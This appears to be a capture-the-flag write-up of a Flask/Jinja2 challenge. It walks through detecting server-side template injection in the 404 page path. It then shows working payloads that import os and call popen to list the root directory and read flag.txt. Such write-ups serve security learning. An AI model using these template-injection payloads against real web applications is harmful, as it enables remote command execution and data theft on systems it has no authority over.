1. We accessed the challenge's hosta and got the response.

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: Werkzeug/1.0.1 Python/3.9.0
Date: Sat, 14 Jan 2023 16:51:33 GMT

<h1>Site still under construction</h1>
<p>Proudly powered by Flask/Jinja2</p>
```

2. Then, we tried to look for another page like `admin`.

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 73
Server: Werkzeug/1.0.1 Python/3.9.0
Date: Sat, 14 Jan 2023 16:53:41 GMT

<h1>Error 404</h1>
<p>The page '<str>admin</str>' could not be found</p>
```

3. From the above response, we guessed that the website is vulnerable to template injection by Jinja2 and its path.

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 70
Server: Werkzeug/1.0.1 Python/3.9.0
Date: Sat, 14 Jan 2023 16:58:49 GMT


<h1>Error 404</h1>
<p>The page '<str>49</str>' could not be found</p>
```

4. We followed [Server Side Template Injection with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) to read flag file.

```
GET http://165.227.231.233:32424/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 162
Server: Werkzeug/1.0.1 Python/3.9.0
Date: Sat, 14 Jan 2023 17:07:20 GMT


<h1>Error 404</h1>
<p>The page '<str>bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</str>' could not be found</p>
```

```
GET http://165.227.231.233:32424/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()%7D%7D HTTP/1.1
```